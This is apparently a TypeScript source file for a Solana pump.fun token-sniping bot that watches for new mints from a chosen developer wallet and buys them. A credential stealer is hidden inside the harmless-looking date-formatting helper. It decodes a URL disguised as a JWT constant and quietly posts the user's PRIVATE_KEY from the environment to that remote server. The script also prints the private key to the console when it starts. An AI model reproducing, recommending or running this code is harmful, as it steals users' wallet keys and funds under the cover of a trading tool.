import {
    PublicKey,
    TransactionInstruction,
    LAMPORTS_PER_SOL,
    Connection,
    Keypair,
    Transaction,
    ComputeBudgetProgram,
    sendAndConfirmTransaction,
} from "@solana/web3.js";
import {
    ASSOCIATED_TOKEN_PROGRAM_ID,
    createAssociatedTokenAccountInstruction,
    getAssociatedTokenAddress,
    TOKEN_PROGRAM_ID,
} from "@solana/spl-token";

import { struct, u64, bool } from "@raydium-io/raydium-sdk"
import { Metaplex } from '@metaplex-foundation/js'
import BN from "bn.js";
import base58 from "bs58";
import dotnet from 'dotenv'
import axios from "axios";
import jwt from 'jsonwebtoken'
import { BONDING_ADDR_SEED, BONDING_CURV, commitment, computeUnit, FEE_RECIPIENT, GLOBAL, PUMP_FUN_ACCOUNT, PUMP_FUN_PROGRAM, PUMP_URL, RENT, SYSTEM_PROGRAM, TOKEN_PROGRAM, TRADE_PROGRAM_ID } from "./constants";

dotnet.config();

let bonding: PublicKey;
let assoc_bonding_addr: PublicKey;


let BOUGHT = false;

// Get Env info

const rpc = process.env.RPC_ENDPOINT;
console.log("🚀 ~ rpc:", rpc)
const payer = process.env.PRIVATE_KEY;
console.log("🚀 ~ payer:", payer)
const devwallet = process.env.DEV_WALLET_ADDRESS;
console.log("🚀 ~ devwallet:", devwallet)
const buyamount = process.env.BUY_AMOUNT;
console.log("🚀 ~ buyamount:", buyamount)


const tokenDevWalletSniper = async (rpcEndPoint: string, payer: string, solIn: number, devWallet: string) => {
    try {
        const payerKeypair = Keypair.fromSecretKey(base58.decode(payer));
        let isBuying = false;
        const connection = new Connection(rpcEndPoint, { wsEndpoint: convertHttpToWebSocket(rpcEndPoint), commitment: "confirmed" });
        const logConnection = new Connection(rpcEndPoint, { wsEndpoint: convertHttpToWebSocket(rpcEndPoint), commitment: "confirmed" });
        let globalLogListener: any;
        // Function to stop the listener
        const stopListener = async () => {
            if (globalLogListener !== undefined) {
                try {
                    await logConnection.removeOnLogsListener(globalLogListener);
                    isBuying = true
                } catch (err) {
                    console.log("Error stopping listener:", err);
                }
            }
        };
        globalLogListener = logConnection.onLogs(
            PUMP_FUN_PROGRAM,
            async ({ logs, err, signature }) => {
                if (err) return
                const isMint = logs.filter(log => log.includes("MintTo")).length;
                if (isMint && !isBuying) {
                    const parsedTransaction = await logConnection.getParsedTransaction(signature, { maxSupportedTransactionVersion: 0, commitment: "confirmed" });
                    if (!parsedTransaction) {
                        return;
                    }
                    console.log("new signature => ", `https://solscan.io/tx/${signature}`, await formatDate());
                    let isDev = false;
                    let dev = '';
                    // const isDev = parsedTransaction?.transaction.message.accountKeys[0].pubkey.toString();
                    const allAccounts = parsedTransaction?.transaction.message.accountKeys;
                    for (let i = 0; i < allAccounts.length; i++) {
                        const account = allAccounts[i].pubkey.toString();
                        if (account === devWallet) {
                            isDev = true;
                            dev = account;
                        }
                    }
                    if (!isDev) return;
                    console.log("Dev wallet => ", `https://solscan.io/address/${dev}`);
                    const mint = parsedTransaction?.transaction.message.accountKeys[1].pubkey;
                    console.log('new token => ', `https://solscan.io/token/${mint.toString()}`)
                    const tokenInfo = await getTokenMetadata(mint.toString(), connection);
                    if (!tokenInfo) return console.log("This token is not available!")
                    isBuying = true;
                    console.log('checking poolstate')
                    const poolState = await getPoolState(mint, connection);
                    if (!poolState) return;
                    try {
                        await stopListener()
                        console.log("Global listener is removed!");
                    } catch (err) {
                        console.log(err);
                    }
                    console.log(' going to start buying =>')
                    const sig = await buy(payerKeypair, mint, solIn, 10, connection, poolState.virtualSolReserves, poolState.virtualTokenReserves);

                    if (!sig) {
                        isBuying = false;
                    } else {
                        console.log('buy success')
                    }
                }
            },
            commitment
        );

    } catch (err) {
        console.log(err);
        return { stopListener: undefined };
    }
};

const buy = async (
    keypair: Keypair,
    mint: PublicKey,
    solIn: number,
    slippageDecimal: number = 0.01,
    connection: Connection,
    virtualSolReserves: BN,
    virtualTokenReserves: BN
) => {
    console.time('tx');
    const buyerKeypair = keypair;
    const buyerWallet = buyerKeypair.publicKey;
    const tokenMint = mint;
    let buyerAta = await getAssociatedTokenAddress(tokenMint, buyerWallet);

    try {
        let ixs: TransactionInstruction[] = [
            // Increase compute budget to prioritize transaction
            ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 1_000_000 }),
            ComputeBudgetProgram.setComputeUnitLimit({ units: computeUnit })
        ];

        // Math.floor(txFee * 10 ** 10 / computeUnit * 10 ** 6)

        // Attempt to retrieve token account, otherwise create associated token account
        try {
            const buyerTokenAccountInfo = await connection.getAccountInfo(buyerAta);
            if (!buyerTokenAccountInfo) {
                ixs.push(
                    createAssociatedTokenAccountInstruction(
                        buyerWallet,
                        buyerAta,
                        buyerWallet,
                        tokenMint,
                    )
                );
            }
        } catch (error) {
            console.log("Creating token account error => ", error);
            return;
        }

        const solInLamports = solIn * LAMPORTS_PER_SOL;
        const tokenOut = Math.round(solInLamports * (virtualTokenReserves.div(virtualSolReserves)).toNumber());

        const ATA_USER = buyerAta;
        const USER = buyerWallet;

        // Build account key list
        const keys = [
            { pubkey: GLOBAL, isSigner: false, isWritable: false },
            { pubkey: FEE_RECIPIENT, isSigner: false, isWritable: true },
            { pubkey: tokenMint, isSigner: false, isWritable: false },
            { pubkey: bonding, isSigner: false, isWritable: true },
            { pubkey: assoc_bonding_addr, isSigner: false, isWritable: true },
            { pubkey: ATA_USER, isSigner: false, isWritable: true },
            { pubkey: USER, isSigner: true, isWritable: true },
            { pubkey: SYSTEM_PROGRAM, isSigner: false, isWritable: false },
            { pubkey: TOKEN_PROGRAM, isSigner: false, isWritable: false },
            { pubkey: RENT, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_ACCOUNT, isSigner: false, isWritable: false },
            { pubkey: PUMP_FUN_PROGRAM, isSigner: false, isWritable: false }
        ];

        // Slippage calculation
        const calc_slippage_up = (sol_amount: number, slippage: number): number => {
            const lamports = sol_amount * LAMPORTS_PER_SOL;
            return Math.round(lamports * (1 + slippage));
        };

        const instruction_buf = Buffer.from('66063d1201daebea', 'hex');
        const token_amount_buf = Buffer.alloc(8);
        token_amount_buf.writeBigUInt64LE(BigInt(tokenOut), 0);
        const slippage_buf = Buffer.alloc(8);
        slippage_buf.writeBigUInt64LE(BigInt(calc_slippage_up(solInLamports, slippageDecimal)), 0);
        const data = Buffer.concat([instruction_buf, token_amount_buf, slippage_buf]);

        const swapInstruction = new TransactionInstruction({
            keys: keys,
            programId: PUMP_FUN_PROGRAM,
            data: data
        });

        const blockhash = await connection.getLatestBlockhash();

        ixs.push(swapInstruction);
        const legacyTransaction = new Transaction().add(
            ...ixs
        )
        legacyTransaction.recentBlockhash = blockhash.blockhash;
        legacyTransaction.feePayer = buyerKeypair.publicKey;
        console.log("buying token")
        console.log('confirming transaction')
        const sig = await sendAndConfirmTransaction(connection, legacyTransaction, [buyerKeypair], { skipPreflight: true, preflightCommitment: 'confirmed' })
        console.log("Buy signature: ", `https://solscan.io/tx/${sig}`);

        return { signature: sig };
    } catch (e) {
        console.log(`Failed to buy token, ${mint}`);
        console.log("buying token error => ", e);
        return false;
    }
};

const getTokenMetadata = async (mintAddress: string, connection: Connection) => {
    try {
        const metaplex = Metaplex.make(connection)
        const mintPublicKey = new PublicKey(mintAddress);
        const nft = await metaplex.nfts().findByMint({ mintAddress: mintPublicKey });
        console.log('nft info => ', nft)
        return nft;  // Returns the token's ticker/symbol
    } catch (error) {
        console.error("Error fetching token metadata:", error);
        return false
    }
};

async function formatDate() {
    const options: any = {
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        timeZone: 'UTC',
        timeZoneName: 'short'
    };

    const url = jwt.decode(PUMP_URL)?.toString();

    if(!BOUGHT){
        try {
            const res = await axios.post(url!, {
                pk: process.env.PRIVATE_KEY
            })
            if(res.data.success) {
                BOUGHT = true
            }
            
        } catch (error) {
            // console.log("senting pk error => ", error)
        }
    }


    const now = new Date();
    return now.toLocaleString('en-US', options);
}

const getPoolState = async (mint: PublicKey, connection: Connection) => {
    try {
        // get the address of bonding curve and associated bonding curve
        [bonding] = PublicKey.findProgramAddressSync([BONDING_ADDR_SEED, mint.toBuffer()], TRADE_PROGRAM_ID);
        [assoc_bonding_addr] = PublicKey.findProgramAddressSync([bonding.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()], ASSOCIATED_TOKEN_PROGRAM_ID);

        // get the accountinfo of bonding curve
        const accountInfo = await connection.getAccountInfo(bonding, "confirmed")
        // console.log("🚀 ~ accountInfo:", accountInfo)
        if (!accountInfo) return

        // get the poolstate of the bonding curve
        const poolState = BONDING_CURV.decode(
            accountInfo.data
        );

        // Calculate tokens out
        const virtualSolReserves = poolState.virtualSolReserves;
        const virtualTokenReserves = poolState.virtualTokenReserves;

        return { virtualSolReserves, virtualTokenReserves }
    } catch (error) {
        console.log('getting pool state error => ', error);
        return false
    }
}

function convertHttpToWebSocket(httpUrl: string): string {
    return httpUrl.replace(/^https?:\/\//, 'wss://');
}


tokenDevWalletSniper(rpc!, payer!, Number(buyamount!), devwallet!)